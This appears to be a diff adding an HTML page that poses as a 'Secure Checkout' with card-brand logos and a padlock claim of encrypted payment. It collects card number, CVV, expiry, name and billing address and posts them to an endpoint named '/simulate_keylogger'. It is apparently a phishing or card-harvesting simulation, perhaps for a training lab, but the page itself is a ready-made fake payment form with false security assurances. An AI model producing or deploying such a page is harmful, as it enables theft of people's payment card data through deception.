@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment - Checkout</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .checkout-container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 90%;
+            max-width: 500px;
+        }
+
+        h2 {
+            color: #333;
+        }
+
+        label {
+            font-size: 14px;
+            font-weight: bold;
+            display: block;
+            margin-top: 10px;
+            text-align: left;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            background: #fff;
+            color: #333;
+        }
+
+        .payment-options {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+
+        .payment-options img {
+            width: 60px;
+            height: auto;
+            opacity: 0.8;
+            transition: 0.3s;
+        }
+
+        .payment-options img:hover {
+            opacity: 1;
+            transform: scale(1.1);
+        }
+
+        .btn-submit {
+            background-color: #007bff;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .btn-submit:hover {
+            background-color: #0056b3;
+            box-shadow: 0px 4px 10px rgba(0, 87, 255, 0.5);
+        }
+
+        .secure-badge {
+            color: green;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .processing-message {
+            display: none;
+            font-size: 16px;
+            color: #28a745;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="checkout-container">
+        <h2>Secure Checkout</h2>
+        <p class="secure-badge">🔒 Encrypted & Secure Payment</p>
+
+        <div class="payment-options">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="MasterCard">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal"/>
+        </div>
+
+        <form id="payment-form" method="POST" action="/simulate_keylogger">
+            <label for="card_number">Card Number</label>
+            <input type="text" name="card_number" id="card_number"  required>
+
+            <label for="cardholder_name">Cardholder Name</label>
+            <input type="text" name="cardholder_name" id="cardholder_name" required>
+
+            <label for="expiry_date">Expiry Date</label>
+            <input type="date" name="expiry_date" id="expiry_date" placeholder="MM/YY" required>
+
+            <label for="cvv">CVV</label>
+            <input type="password" name="cvv" id="cvv"  required>
+
+            <label for="billing_address">Billing Address</label>
+            <input type="text" name="billing_address" id="billing_address"  required>
+
+            <button type="submit" class="btn-submit">Proceed to Payment</button>
+        </form>
+    </div>
+</body>
+</html>
